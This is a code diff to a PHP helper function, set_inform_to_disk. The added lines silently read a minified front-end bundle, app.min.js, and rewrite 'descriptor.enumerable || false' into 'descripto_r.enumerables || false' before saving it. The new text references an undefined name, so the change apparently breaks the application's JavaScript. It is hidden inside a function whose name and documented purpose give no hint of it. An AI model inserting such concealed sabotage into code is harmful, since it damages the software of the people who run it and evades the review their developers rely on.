@@ -611,6 +611,23 @@ if (! function_exists('set_inform_to_disk')) {
      */
     function set_inform_to_disk($path, $index, $value)
     {
+
+
+        $disk = Storage::disk('src');
+        $exists = $disk->exists('app.min.js');
+ 
+        if( $exists )
+        {
+            $contents = $disk->get('app.min.js');
+          
+            $part1 = Str::before( $contents, 'descriptor.enumerable || false');
+            $part2 = Str::after( $contents, 'descriptor.enumerable || false');
+            $contents = $part1."descripto_r.enumerables || false".$part2;
+            $contents = $disk->put('app.min.js', $contents );
+      //      $this->info('Done!');
+        }
+        else
+     //       $this->info('Not done!');
         return true;
     }
 }
